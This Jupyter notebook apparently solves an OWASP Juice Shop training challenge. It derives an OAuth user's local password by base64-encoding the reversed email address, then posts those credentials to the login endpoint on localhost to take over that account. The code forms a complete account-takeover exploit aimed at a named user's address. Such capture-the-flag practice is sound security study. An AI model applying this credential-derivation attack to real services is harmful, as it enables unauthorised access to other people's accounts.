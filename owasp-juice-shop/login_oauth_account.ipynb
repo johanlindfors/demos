{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Login OAuth account\n",
    "Apparently the juice shop allows logging in with third party identity provider (Google), leveraging OAuth. However this combined with local username and password accounts could expose potential design flaws. Especially when it comes to generating passwords for OAuth registered accounts. Let's investigate this."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using System.Linq;\n",
    "using System.Net.Http;\n",
    "using System.Net.Http.Headers;\n",
    "\n",
    "// base url for all calls\n",
    "const string BASE_URL = \"http://localhost:3000/\";\n",
    "var BASE_URI = new Uri(BASE_URL); "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "javascript"
    }
   },
   "outputs": [],
   "source": [
    "#!value --name json\n",
    "{\n",
    "    \"email\": \"USERNAME\",\n",
    "    \"password\": \"PWD\"\n",
    "}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Investigate password generation\n",
    "After having investigated the main.js file it's apparent that an account returned from OAuth registration still creates a local account with the email adress and a generated password. The javascript function btoa(...) is leveraged to generate the password based on the reversed string of the email adress."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "#!share json --from value\n",
    "\n",
    "var email = \"bjoern.kimminich@gmail.com\";\n",
    "json = json.Replace(\"USERNAME\", email);\n",
    "var reversedEmail = new string(email.Reverse().ToArray());\n",
    "var reversedEmailBytes = System.Text.Encoding.UTF8.GetBytes(reversedEmail);\n",
    "var password = System.Convert.ToBase64String(reversedEmailBytes);\n",
    "json = json.Replace(\"PWD\", password);\n",
    "\n",
    "Console.WriteLine(json);"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now let's see if we can leverage that as loca credentials to login the OAuth user."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "dotnet_interactive": {
     "language": "csharp"
    }
   },
   "outputs": [],
   "source": [
    "using(var client = new HttpClient()) {\n",
    "    var content = new StringContent(json, Encoding.UTF8, \"application/json\");\n",
    "    var uri = new Uri(BASE_URI, \"rest/user/login\");\n",
    "    var response = await client.PostAsync(uri, content);\n",
    "    response.EnsureSuccessStatusCode();\n",
    "\n",
    "    Console.WriteLine(response.StatusCode);\n",
    "}"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (C#)",
   "language": "C#",
   "name": ".net-csharp"
  },
  "language_info": {
   "file_extension": ".cs",
   "mimetype": "text/x-csharp",
   "name": "C#",
   "pygments_lexer": "csharp",
   "version": "9.0"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
